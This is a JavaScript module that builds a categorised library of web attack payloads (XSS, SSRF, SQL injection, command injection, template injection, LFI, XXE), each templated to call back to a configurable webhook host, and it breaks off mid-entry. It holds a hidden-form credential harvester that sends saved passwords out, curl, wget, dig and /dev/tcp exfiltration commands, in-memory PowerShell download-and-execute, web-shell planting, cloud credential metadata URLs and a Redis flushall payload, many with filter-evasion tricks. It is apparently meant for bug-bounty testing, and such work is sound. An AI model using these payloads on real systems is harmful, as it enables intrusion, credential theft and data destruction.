/**
 * Battle-Tested Security Testing & Vulnerability Payload Library
 * Curated from PayloadsAllTheThings, SecLists, PortSwigger Web Security Academy,
 * Assetnote, and top bug bounty research.
 * 
 * Pre-configured dynamically with active webhook endpoint and Blind XSS URLs.
 */
export function getPayloadsData({ webhookUrl, xssPayloadUrl, webhookHost, id }) {
  return [
    {
      category: 'XSS',
      title: 'Cross-Site Scripting (XSS)',
      items: [
        { 
          title: 'Dynamic Blind XSS Module Import', 
          code: `top['ev'+'al']('import("${xssPayloadUrl}")')`, 
          desc: 'Dynamic ES6 module import using bracketed eval to evade string keyword filters and static AST parsers.',
          priority: 'HIGH', 
          era: 'Evasion / Modern',
          tech: 'Browser JS'
        },
        { 
          title: 'HTML5 Ontoggle Event Handler', 
          code: `<details open ontoggle="import('${xssPayloadUrl}')">`, 
          desc: 'Auto-executes via details element toggle event without user interaction; bypasses regex rules targeting onload/onerror.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'HTML5 / JS'
        },
        { 
          title: 'SVG SMIL Animation Injection', 
          code: `<svg><animate onbegin="import('${xssPayloadUrl}')" attributeName=x>`, 
          desc: 'Executes automatically when SMIL animation starts without user interaction, body tags, or image elements.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'SVG / JS'
        },
        { 
          title: 'Autofocus Onfocusin Event Trigger', 
          code: `<input autofocus onfocusin="import('${xssPayloadUrl}')">`, 
          desc: 'Triggers automatically on DOM render via modern focusin event; evades blocklists checking onfocus.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'HTML5 Form / JS'
        },
        { 
          title: 'MathML Namespace ForeignObject Injection', 
          code: `<math><mtext><table><mglyph><style><!--</style><img src=x onerror="import('${xssPayloadUrl}')">`, 
          desc: 'Mutation XSS (mXSS) exploiting XML/HTML namespace parsing discrepancies in client sanitizers.',
          priority: 'HIGH', 
          era: 'mXSS Bypass',
          tech: 'MathML / SVG'
        },
        { 
          title: 'Fetch & Scope Dynamic Evaluation', 
          code: `fetch('${xssPayloadUrl}').then(r=>r.text()).then(t=>top['ev'+'al'](t))`, 
          desc: 'Pulls and evaluates remote script content dynamically using fetch API; bypasses script tag filters.',
          priority: 'HIGH', 
          era: 'Modern Syntax',
          tech: 'Browser API'
        },
        { 
          title: 'Iframe Srcdoc Entity-Encoded Script', 
          code: `<iframe srcdoc="&lt;script src='${xssPayloadUrl}'&gt;&lt;/script&gt;"></iframe>`, 
          desc: 'Executes external script within an isolated iframe using HTML-entity encoded srcdoc content.',
          priority: 'HIGH', 
          era: 'Evasion / Bypass',
          tech: 'Iframe / HTML'
        },
        { 
          title: 'Context-Breaking Blind XSS Polyglot', 
          code: `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=import('${xssPayloadUrl}') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sCrIpt/src='${xssPayloadUrl}'>\\x3e`, 
          desc: 'Multi-context polyglot breaking out of raw HTML, attribute strings, script blocks, and comments.',
          priority: 'HIGH', 
          era: 'Polyglot',
          tech: 'HTML / JS'
        },
        { 
          title: 'CSP Bypass via Google CDN JSONP Gadget', 
          code: `<script src="https://www.google.com/complete/search?client=chrome&q=x&jsonp=import('${xssPayloadUrl}')"></script>`, 
          desc: 'Bypasses strict Content Security Policy allowing google.com domains via JSONP callback execution.',
          priority: 'HIGH', 
          era: 'CSP Bypass',
          tech: 'CSP / JSONP'
        },
        { 
          title: 'CSP Base-URI Injection Hijacking', 
          code: `<base href="${webhookUrl}/">`, 
          desc: 'Overrides relative script path resolutions to load relative scripts directly from your webhook receiver.',
          priority: 'HIGH', 
          era: 'CSP Bypass',
          tech: 'HTML Base'
        },
        { 
          title: 'AngularJS Client-Side Template Injection (CSTI)', 
          code: `{{constructor.constructor("import('${xssPayloadUrl}')")()}}`, 
          desc: 'Escapes AngularJS client-side sandbox via Function constructor traversal.',
          priority: 'HIGH', 
          era: 'Sandbox Escape',
          tech: 'AngularJS'
        },
        { 
          title: 'Vue.js Client-Side Template Injection', 
          code: `{{_c.constructor("import('${xssPayloadUrl}')")()}}`, 
          desc: 'Executes arbitrary JavaScript within vulnerable Vue.js template-interpolated user inputs.',
          priority: 'HIGH', 
          era: 'Sandbox Escape',
          tech: 'Vue.js'
        },
        { 
          title: 'Browser Autofill Credential Harvester', 
          code: `(function(){var f=document.createElement('form'),u=document.createElement('input'),p=document.createElement('input');p.type='password';f.appendChild(u);f.appendChild(p);document.body.appendChild(f);setTimeout(()=>{fetch('${webhookUrl}/?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value))},1000);})()`, 
          desc: 'Invisible form triggering browser password autofill and exfiltrating saved credentials to webhook.',
          priority: 'HIGH', 
          era: 'Credential Capture',
          tech: 'Browser Autofill'
        },
        { 
          title: 'Markdown / URI Link Injection', 
          code: `[Click to view](javascript:import('${xssPayloadUrl}'))`, 
          desc: 'Triggers Blind XSS when a user or administrator clicks a markdown-rendered link.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'Markdown / URI'
        },
        { 
          title: 'Image Onerror Module Import', 
          code: `<img src=x onerror="import('${xssPayloadUrl}').catch(()=>{})">`, 
          desc: 'Standard image tag onerror callback using ES6 import with silent exception catch.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'HTML5 / JS'
        },
        { 
          title: 'Direct Script Tag Inclusion', 
          code: `<script src="${xssPayloadUrl}"></script>`, 
          desc: 'Direct script tag inclusion for verifying unfiltered inputs and admin dashboards.',
          priority: 'LOW', 
          era: 'Baseline / Probe',
          tech: 'HTML Script'
        }
      ]
    },
    {
      category: 'SSRF',
      title: 'Server-Side Request Forgery (SSRF)',
      items: [
        { 
          title: 'AWS IMDSv1 IAM Role Credentials', 
          code: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', 
          desc: 'Dumps assigned EC2 IAM instance profile names; append role name to fetch temporary AWS keys.',
          priority: 'HIGH', 
          era: 'Cloud Metadata',
          tech: 'AWS EC2'
        },
        { 
          title: 'AWS IMDSv2 Token Fetch & Header Injection', 
          code: 'curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"', 
          desc: 'Retrieves session token required for querying IMDSv2 metadata on modern AWS instances.',
          priority: 'HIGH', 
          era: 'Cloud Metadata',
          tech: 'AWS IMDSv2'
        },
        { 
          title: 'Google Cloud (GCP) Compute Metadata Token', 
          code: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', 
          desc: 'Extracts GCP service account access token (requires header Metadata-Flavor: Google).',
          priority: 'HIGH', 
          era: 'Cloud Metadata',
          tech: 'Google Cloud (GCP)'
        },
        { 
          title: 'Azure Instance Metadata Service (IMDS)', 
          code: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', 
          desc: 'Dumps Azure VM metadata including subscription, resource group, and VM ID (requires header Metadata: true).',
          priority: 'HIGH', 
          era: 'Cloud Metadata',
          tech: 'Microsoft Azure'
        },
        { 
          title: 'DigitalOcean Droplet Metadata', 
          code: 'http://169.254.169.254/metadata/v1.json', 
          desc: 'Retrieves JSON metadata including user-data, SSH keys, and networking on DigitalOcean droplets.',
          priority: 'HIGH', 
          era: 'Cloud Metadata',
          tech: 'DigitalOcean'
        },
        { 
          title: 'Alibaba Cloud ECS Metadata Token', 
          code: 'http://100.100.100.200/latest/meta-data/ram/security-credentials/', 
          desc: 'Extracts Alibaba Cloud RAM temporary credentials from link-local ECS endpoint.',
          priority: 'HIGH', 
          era: 'Cloud Metadata',
          tech: 'Alibaba Cloud'
        },
        { 
          title: 'Oracle Cloud Infrastructure (OCI) Metadata', 
          code: 'http://169.254.169.254/opc/v1/instance/', 
          desc: 'Extracts instance metadata and compartment OCIDs for Oracle Cloud compute nodes.',
          priority: 'HIGH', 
          era: 'Cloud Metadata',
          tech: 'Oracle Cloud'
        },
        { 
          title: 'Kubernetes Pod ServiceAccount Secret', 
          code: 'https://kubernetes.default.svc/var/run/secrets/kubernetes.io/serviceaccount/token', 
          desc: 'Reads internal Kubernetes pod JWT service account token for cluster API interaction.',
          priority: 'HIGH', 
          era: 'Cloud Metadata',
          tech: 'Kubernetes'
        },
        { 
          title: 'Docker Daemon REST API Container List', 
          code: 'http://127.0.0.1:2375/v1.24/containers/json', 
          desc: 'Queries exposed unauthenticated Docker TCP socket to list active containers and environment keys.',
          priority: 'HIGH', 
          era: 'Container API',
          tech: 'Docker Engine'
        },
        { 
          title: 'HashiCorp Consul Self Config & Keys', 
          code: 'http://127.0.0.1:8500/v1/agent/self', 
          desc: 'Dumps Consul agent configuration, cluster tokens, and internal service registrations.',
          priority: 'HIGH', 
          era: 'Service Mesh',
          tech: 'Consul'
        },
        { 
          title: 'Elasticsearch Cluster Health & Indices', 
          code: 'http://127.0.0.1:9200/_cat/indices?v', 
          desc: 'Lists unauthenticated Elasticsearch cluster indices and document counts.',
          priority: 'HIGH', 
          era: 'Database API',
          tech: 'Elasticsearch'
        },
        { 
          title: 'Redis SSRF via Gopher Protocol', 
          code: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$6%0d%0apwned%0d%0a', 
          desc: 'Uses gopher:// protocol to send raw TCP RESP commands to internal Redis instances.',
          priority: 'HIGH', 
          era: 'Protocol Smuggling',
          tech: 'Redis / Gopher'
        },
        { 
          title: 'SMTP Mail Relay via Gopher Protocol', 
          code: `gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM%3A%3Croot%40localhost%3E%0d%0aRCPT%20TO%3A%3Cadmin%40localhost%3E%0d%0aDATA%0d%0aFrom%3A%20alert%0d%0aSubject%3A%20Pwned%0d%0a%0d%0aSSRF%20Reported%0d%0a.%0d%0aQUIT`, 
          desc: 'Smuggles SMTP commands to send internal emails via local MTA or mail daemon.',
          priority: 'HIGH', 
          era: 'Protocol Smuggling',
          tech: 'SMTP / Gopher'
        },
        { 
          title: 'DNS Rebinding Dynamic Domain Loopback', 
          code: 'http://127.0.0.1.nip.io/', 
          desc: 'Resolves to 127.0.0.1 via wildcard DNS provider; evades static regex hostname filters.',
          priority: 'MEDIUM', 
          era: 'Filter Bypass',
          tech: 'DNS Rebinding'
        },
        { 
          title: 'Decimal IP (Dword) Localhost', 
          code: 'http://2130706433/', 
          desc: '32-bit decimal equivalent of 127.0.0.1; evades string-based IP regex and blocklists.',
          priority: 'MEDIUM', 
          era: 'Filter Bypass',
          tech: 'IPv4 Parser'
        },
        { 
          title: 'IPv6 Compressed Loopback', 
          code: 'http://[::1]/', 
          desc: 'Standard IPv6 localhost loopback format; bypasses IPv4-only filtering.',
          priority: 'MEDIUM', 
          era: 'Filter Bypass',
          tech: 'IPv6'
        },
        { 
          title: 'OOB Callback SSRF Probe', 
          code: `${webhookUrl}?src=ssrf_probe`, 
          desc: 'Direct callback link to verify out-of-band network connectivity and source IP routing.',
          priority: 'LOW', 
          era: 'Baseline / Probe',
          tech: 'HTTP OOB'
        }
      ]
    },
    {
      category: 'SQLI',
      title: 'SQL Injection (SQLi)',
      items: [
        { 
          title: 'PostgreSQL COPY TO PROGRAM (Admin RCE)', 
          code: `';COPY (SELECT '') TO PROGRAM 'curl ${webhookUrl}/?pg='||user;--`, 
          desc: 'PostgreSQL stacked query executing curl with current database username (superuser required).',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'PostgreSQL'
        },
        { 
          title: 'MSSQL xp_dirtree Out-of-Band SMB / DNS', 
          code: `';EXEC master..xp_dirtree '\\\\${webhookHost}\\a';--`, 
          desc: 'Triggers outbound SMB/DNS resolution from SQL Server to exfiltrate database context out-of-band.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Microsoft SQL Server'
        },
        { 
          title: 'MSSQL xp_cmdshell HTTP Exfiltration', 
          code: `';EXEC master..xp_cmdshell 'curl ${webhookUrl}/?db=' + DB_NAME();--`, 
          desc: 'Direct system shell execution in MSSQL piping current database name to webhook listener.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Microsoft SQL Server'
        },
        { 
          title: 'Oracle UTL_HTTP Out-of-Band Exfiltration', 
          code: `' UNION SELECT UTL_HTTP.request('${webhookUrl}/?v='||user) FROM dual--`, 
          desc: 'Sends out-of-band HTTP GET request from Oracle Database engine containing current user.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Oracle DB'
        },
        { 
          title: 'Oracle DBMS_LDAP Out-of-Band DNS Exfiltration', 
          code: `' UNION SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.${webhookHost}', 80) FROM dual--`, 
          desc: 'Triggers out-of-band DNS query to exfiltrate database user without requiring HTTP network egress.',
          priority: 'HIGH', 
          era: 'DNS Exfiltration',
          tech: 'Oracle DB'
        },
        { 
          title: 'MySQL LOAD_FILE Out-of-Band UNC Path', 
          code: `SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT user()), '.${webhookHost}\\\\a'));`, 
          desc: 'Performs Windows UNC DNS lookup via LOAD_FILE to exfiltrate current user out-of-band.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'MySQL (Windows)'
        },
        { 
          title: 'SQLite ATTACH DATABASE Web Shell Injection', 
          code: `';ATTACH DATABASE '/var/www/html/shell.php' AS lol;CREATE TABLE lol.pwn(data text);INSERT INTO lol.pwn VALUES('<?php system($_GET["c"]); ?>');--`, 
          desc: 'Attaches a new SQLite database file inside web root and inserts PHP web shell.',
          priority: 'HIGH', 
          era: 'Web Shell RCE',
          tech: 'SQLite'
        },
        { 
          title: 'MySQL Heavy Query Time-Based Sleep', 
          code: `' OR (SELECT 1 FROM (SELECT(SLEEP(5)))x)-- -`, 
          desc: 'Deterministic 5-second sleep query to confirm blind injection without syntax errors.',
          priority: 'HIGH', 
          era: 'Blind / Time-Based',
          tech: 'MySQL / MariaDB'
        },
        { 
          title: 'PostgreSQL pg_sleep Blind', 
          code: `';SELECT pg_sleep(5);--`, 
          desc: 'Stacked query executing 5-second pg_sleep for PostgreSQL blind verification.',
          priority: 'HIGH', 
          era: 'Blind / Time-Based',
          tech: 'PostgreSQL'
        },
        { 
          title: 'JSON Path SQLi Extraction Probe', 
          code: `' OR json_extract(data, '$.role') = 'admin'-- -`, 
          desc: 'Extracts and validates structured JSON document properties in modern SQL databases.',
          priority: 'MEDIUM', 
          era: 'JSON Query',
          tech: 'MySQL / Postgres'
        },
        { 
          title: 'Space-less Comments Bypass', 
          code: `'/**/UNION/**/SELECT/**/NULL,CONCAT(0x7e,user(),0x7e),NULL-- -`, 
          desc: 'Replaces whitespace characters with empty inline comments (/**/) to evade space filters.',
          priority: 'MEDIUM', 
          era: 'Filter Bypass',
          tech: 'MySQL / MariaDB'
        },
        { 
          title: 'Scientific Notation Numeric Bypass', 
          code: `' OR 1e0=1e0-- -`, 
          desc: 'Uses scientific notation (1e0) to evade integer validation and simple string comparators.',
          priority: 'MEDIUM', 
          era: 'Filter Bypass',
          tech: 'MySQL / PostgreSQL'
        },
        { 
          title: 'Hexadecimal String Injection', 
          code: '0x61646d696e', 
          desc: 'Bypasses quote filtering by translating SQL string constraints directly to base-16 hex literals.',
          priority: 'MEDIUM', 
          era: 'Filter Bypass',
          tech: 'MySQL / SQLite'
        },
        { 
          title: 'Basic Authentication Bypass', 
          code: `' OR 1=1-- -`, 
          desc: 'Standard boolean expression override for unquoted or single-quoted authentication forms.',
          priority: 'LOW', 
          era: 'Baseline / Probe',
          tech: 'SQL Standard'
        }
      ]
    },
    {
      category: 'RCE',
      title: 'Command Injection (RCE)',
      items: [
        { 
          title: 'Linux Bash Base64 OOB Exfiltration', 
          code: `curl ${webhookUrl}/?r=$(id|base64|tr -d '\\n')`, 
          desc: 'Executes id, base64 encodes the output without newlines, and sends via query parameter.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Linux / Bash'
        },
        { 
          title: 'Linux Bash Native /dev/tcp Socket Exfiltration', 
          code: `bash -c 'exec 3<>/dev/tcp/${webhookHost}/80;echo -e "GET /api/r/${id}?c=$(id|base64) HTTP/1.1\\r\\nHost: ${webhookHost}\\r\\nConnection: close\\r\\n\\r\\n">&3;cat<&3'`, 
          desc: 'Exfiltrates output using native Bash file descriptors without requiring curl, wget, or nc.',
          priority: 'HIGH', 
          era: 'Native Socket',
          tech: 'Linux / Bash'
        },
        { 
          title: 'Linux Space-less ($IFS) Command Bypass', 
          code: `curl$IFS${webhookUrl}/?q=$(whoami)`, 
          desc: 'Uses Internal Field Separator ($IFS) in place of whitespace to evade strict space filters.',
          priority: 'HIGH', 
          era: 'Filter Bypass',
          tech: 'Linux / Bash'
        },
        { 
          title: 'Linux Redirection Operator Space Bypass', 
          code: `cat</etc/passwd|curl+-X+POST+--data-binary+@-+$URL`, 
          desc: 'Uses redirection operators (<) instead of spaces to pipe file contents into web requests.',
          priority: 'HIGH', 
          era: 'Filter Bypass',
          tech: 'Linux / POSIX Shell'
        },
        { 
          title: 'Linux Single-Quote String Splitting', 
          code: `c'u'r'l$IFS${webhookUrl}?q=\`id\``, 
          desc: 'Concatenates single-quoted character literals to break WAF binary keyword matching (curl).',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'Linux / POSIX Shell'
        },
        { 
          title: 'Linux Path Wildcard Bypass', 
          code: '/bi?/c*t$IFS/et?/pa??wd', 
          desc: 'Triggers commands using directory wildcard expansion matching, evading keyword filters.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'Linux / Unix'
        },
        { 
          title: 'Linux Hex Encoded Shell String Execution', 
          code: `$'\\x63\\x75\\x72\\x6c'$IFS'${webhookUrl}?who='$($'\\x69\\x64')`, 
          desc: 'Executes commands via ANSI-C quotation ($"\\x..") to evade keyword and ASCII regex filters.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'Linux / Bash'
        },
        { 
          title: 'Linux Wget POST Data Exfiltration', 
          code: `wget --post-data="$(id)" ${webhookUrl}`, 
          desc: 'Sends command output in the HTTP POST body via wget on systems where curl is absent.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Linux / Unix'
        },
        { 
          title: 'Linux DNS OOB Exfiltration via Dig', 
          code: `dig +short $(whoami).${webhookHost}`, 
          desc: 'Exfiltrates username via DNS resolution; succeeds even when outbound HTTP is blocked.',
          priority: 'HIGH', 
          era: 'DNS Exfiltration',
          tech: 'DNS / Linux'
        },
        { 
          title: 'Windows PowerShell Silent OOB Callback', 
          code: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-RestMethod -Uri '${webhookUrl}?w='+(whoami) -Method GET"`, 
          desc: 'Non-interactive hidden PowerShell execution sending current username to webhook listener.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Windows / PowerShell'
        },
        { 
          title: 'Windows PowerShell DownloadString In-Memory Exec', 
          code: `powershell -ep bypass -nop -c "IEX(New-Object Net.WebClient).DownloadString('${webhookUrl}/stage.ps1')"`, 
          desc: 'Downloads and executes PowerShell script directly in RAM without writing to disk.',
          priority: 'HIGH', 
          era: 'In-Memory Exec',
          tech: 'Windows / PowerShell'
        },
        { 
          title: 'Windows Certutil Stage Download / Beacon', 
          code: `certutil -urlcache -split -f ${webhookUrl}/ping`, 
          desc: 'Abuses built-in Windows certificate utility (Living-off-the-Land) to ping webhook listener.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'Windows LOLBIN'
        },
        { 
          title: 'Windows Cmd Caret Keyword Obfuscation', 
          code: `^c^u^r^l ${webhookUrl}/?win=1`, 
          desc: 'Uses cmd.exe escape carets (^) to evade command keyword pattern matchers.',
          priority: 'MEDIUM', 
          era: 'Filter Bypass',
          tech: 'Windows Cmd'
        },
        { 
          title: 'Semicolon Command Chaining Probe', 
          code: '; id; uname -a', 
          desc: 'Standard semicolon command chaining for testing basic command injection points.',
          priority: 'LOW', 
          era: 'Baseline / Probe',
          tech: 'Linux / Unix'
        }
      ]
    },
    {
      category: 'SSTI',
      title: 'Server-Side Template Injection (SSTI)',
      items: [
        { 
          title: 'Jinja2 Python RCE (Builtins Lookup)', 
          code: `{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}`, 
          desc: 'Leverages lipsum helper globals to access os.popen and execute commands in Python Jinja2.',
          priority: 'HIGH', 
          era: 'Modern Syntax',
          tech: 'Python / Jinja2'
        },
        { 
          title: 'Jinja2 OOB Webhook Exfiltration', 
          code: `{{lipsum.__globals__.__builtins__.__import__('urllib.request').urlopen('${webhookUrl}/?s=' ~ lipsum.__globals__.__builtins__.__import__('os').popen('id').read().strip())}}`, 
          desc: 'Executes system commands and pipes stdout to your webhook listener out-of-band.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Python / Jinja2'
        },
        { 
          title: 'Jinja2 Attribute Filter Bypass (No Quotes)', 
          code: `{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}`, 
          desc: 'Uses Jinja2 attr filter chaining to evade regex blocking quotation marks and brackets.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'Python / Jinja2'
        },
        { 
          title: 'Spring Boot SpEL Expression RCE', 
          code: `\${T(java.lang.Runtime).getRuntime().exec("curl ${webhookUrl}/?r=spel")}`, 
          desc: 'Spring Expression Language (SpEL) injection invoking Runtime.exec out-of-band.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'Java / Spring SpEL'
        },
        { 
          title: 'Java Thymeleaf Pre-parsing Expression RCE', 
          code: `__\${T(java.lang.Runtime).getRuntime().exec("curl ${webhookUrl}/?r=thymeleaf")}__::.x`, 
          desc: 'Exploits Thymeleaf pre-parsing expression syntax (__${...}__) to execute arbitrary commands.',
          priority: 'HIGH', 
          era: 'Template Engine',
          tech: 'Java / Thymeleaf'
        },
        { 
          title: 'Java Apache FreeMarker Execute Gadget', 
          code: `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("curl ${webhookUrl}/?r=freemarker")}`, 
          desc: 'Initializes FreeMarker Execute utility class to spawn shell commands on the hosting server.',
          priority: 'HIGH', 
          era: 'Template Engine',
          tech: 'Java / FreeMarker'
        },
        { 
          title: 'Java Apache Velocity ClassLoader RCE', 
          code: `#set($e = $exp.class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl ${webhookUrl}/?r=velocity"))`, 
          desc: 'Navigates Java reflection classes within Apache Velocity to invoke Runtime.getRuntime().exec().',
          priority: 'HIGH', 
          era: 'Template Engine',
          tech: 'Java / Velocity'
        },
        { 
          title: 'Node.js EJS Child Process Execution', 
          code: `<%= global.process.mainModule.require('child_process').execSync('curl ${webhookUrl}/?v=' + process.version) %>`, 
          desc: 'Evaluates arbitrary Node.js code within unescaped EJS template blocks.',
          priority: 'HIGH', 
          era: 'Modern Syntax',
          tech: 'Node.js / EJS'
        },
        { 
          title: 'Node.js Handlebars Prototype Injection RCE', 
          code: `{{#with "s" as |string|}}{{string.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')()}}{{/with}}`, 
          desc: 'Escapes Handlebars sandbox via string constructor traversal to execute commands.',
          priority: 'HIGH', 
          era: 'Sandbox Escape',
          tech: 'Node.js / Handlebars'
        },
        { 
          title: 'Ruby ERB / Slim Template Subshell Injection', 
          code: `<%= \`curl ${webhookUrl}/?rb=\#{Process.pid}\` %>`, 
          desc: 'Executes backtick system command within Ruby ERB view interpolation.',
          priority: 'HIGH', 
          era: 'Modern Syntax',
          tech: 'Ruby / ERB'
        },
        { 
          title: 'PHP Twig 3.x Filter Execution', 
          code: `{{['id']|filter('system')}}`, 
          desc: 'Passes command array through Twig system filter to execute terminal commands.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'PHP / Twig'
        },
        { 
          title: 'Mathematical Expression Detection Probe', 
          code: '{{7*7}}', 
          desc: 'Tests if input expression evaluates to 49 to confirm presence of active template engine.',
          priority: 'LOW', 
          era: 'Baseline / Probe',
          tech: 'Template Engines'
        }
      ]
    },
    {
      category: 'LFI',
      title: 'Local File Inclusion (LFI)',
      items: [
        { 
          title: 'PHP Filter Base64 Resource Disclosure', 
          code: 'php://filter/convert.base64-encode/resource=index.php', 
          desc: 'Reads PHP source files as base64 without executing server-side code.',
          priority: 'HIGH', 
          era: 'Filter Stream',
          tech: 'PHP Engine'
        },
        { 
          title: 'PHP Data Wrapper Code Execution', 
          code: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id', 
          desc: 'Executes base64 PHP code inline when allow_url_include is enabled.',
          priority: 'HIGH', 
          era: 'Direct Execution',
          tech: 'PHP Engine'
        },
        { 
          title: 'PHP Session Upload Progress LFI to RCE', 
          code: `/tmp/sess_attacker`, 
          desc: 'Includes temporary PHP session file created via PHP_SESSION_UPLOAD_PROGRESS containing web shell payload.',
          priority: 'HIGH', 
          era: 'Session Poisoning',
          tech: 'PHP Engine'
        },
        { 
          title: 'Apache / Nginx Access Log Poisoning', 
          code: '/var/log/apache2/access.log', 
          desc: 'Includes web server access log poisoned with <?php system($_GET["c"]); ?> in User-Agent header.',
          priority: 'HIGH', 
          era: 'Log Poisoning',
          tech: 'Apache / Nginx'
        },
        { 
          title: 'Nginx Off-By-Slash Alias Traversal', 
          code: '/static../etc/passwd', 
          desc: 'Exploits missing trailing slash in Nginx alias directive (/static -> /var/www/static/) to traverse parent dirs.',
          priority: 'HIGH', 
          era: 'Server Misconfig',
          tech: 'Nginx'
        },
        { 
          title: 'Double URL-Encoded Directory Traversal', 
          code: '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd', 
          desc: 'Bypasses reverse proxies and WAFs that perform URL decoding only once.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'Apache / Nginx'
        },
        { 
          title: 'Overlong UTF-8 Slash Traversal', 
          code: '..%c0%af..%c0%af..%c0%afetc/passwd', 
          desc: 'Exploits non-standard UTF-8 multi-byte decoding implementations.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'IIS / Apache'
        },
        { 
          title: 'Headless Chromium / PDF LFI & Exfiltration', 
          code: `<script>fetch('file:///etc/passwd').then(r=>r.text()).then(t=>fetch('${webhookUrl}/?lfi='+btoa(t)))</script>`, 
          desc: 'Runs inside headless PDF engines (Chromium/wkhtmltopdf) to read local files and exfiltrate out-of-band.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'PDF Engine / JS'
        },
        { 
          title: 'Linux Proc Self Environ Read', 
          code: '/proc/self/environ', 
          desc: 'Extracts process environment variables, secret tokens, and configuration paths.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'Linux /proc'
        },
        { 
          title: 'Spring Boot Static Resource Traversal', 
          code: '/static/..%252f..%252f..%252fetc/passwd', 
          desc: 'Exploits static resource routing misconfigurations in Java web applications.',
          priority: 'MEDIUM', 
          era: 'Filter Bypass',
          tech: 'Java Spring'
        },
        { 
          title: 'Classic Directory Traversal', 
          code: '../../../../../../etc/passwd', 
          desc: 'Direct path traversal to verify unfiltered file lookup parameters.',
          priority: 'LOW', 
          era: 'Baseline / Probe',
          tech: 'Linux Filesystem'
        }
      ]
    },
    {
      category: 'XXE',
      title: 'XML External Entity (XXE)',
      items: [
        { 
          title: 'Blind XXE External DTD Parameter Entity', 
          code: `<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "${webhookUrl}/evil.dtd">%dtd;]><foo>&send;</foo>`, 
          desc: 'References external DTD hosting parameter entities to exfiltrate file data via HTTP GET.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'XML / DTD'
        },
        { 
          title: 'Blind XXE Out-of-Band FTP Exfiltration', 
          code: `<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "${webhookUrl}/ftp.dtd">%dtd;]><foo>&send;</foo>`, 
          desc: 'Sends file contents containing newlines over FTP protocol which handles multiline buffers cleaner than HTTP.',
          priority: 'HIGH', 
          era: 'OOB Callback',
          tech: 'XML / FTP'
        },
        { 
          title: 'PHP Filter Stream Base64 XXE', 
          code: `<!DOCTYPE foo [<!ENTITY % pay SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % dtd SYSTEM "${webhookUrl}/dtd">%dtd;]>`, 
          desc: 'Encodes local file content in base64 before external evaluation to avoid XML parser breaking on special chars.',
          priority: 'HIGH', 
          era: 'Evasion / Modern',
          tech: 'PHP XML'
        },
        { 
          title: 'Java Netdoc URL Protocol Local File Read', 
          code: '<!DOCTYPE test [<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">]><test>&xxe;</test>', 
          desc: 'Uses Java-specific netdoc:/// URL handler to bypass file:/// protocol restrictions.',
          priority: 'HIGH', 
          era: 'Filter Bypass',
          tech: 'Java XML'
        },
        { 
          title: 'Java Jar Protocol File Unpacking Traversal', 
          code: `<!DOCTYPE test [<!ENTITY xxe SYSTEM "jar:${webhookUrl}/archive.zip!/file.txt">]><test>&xxe;</test>`, 
          desc: 'Downloads zip archive and extracts internal file via Java jar: protocol handler.',
          priority: 'HIGH', 
          era: 'Protocol Handler',
          tech: 'Java XML'
        },
        { 
          title: 'SVG Image Upload XXE Callback', 
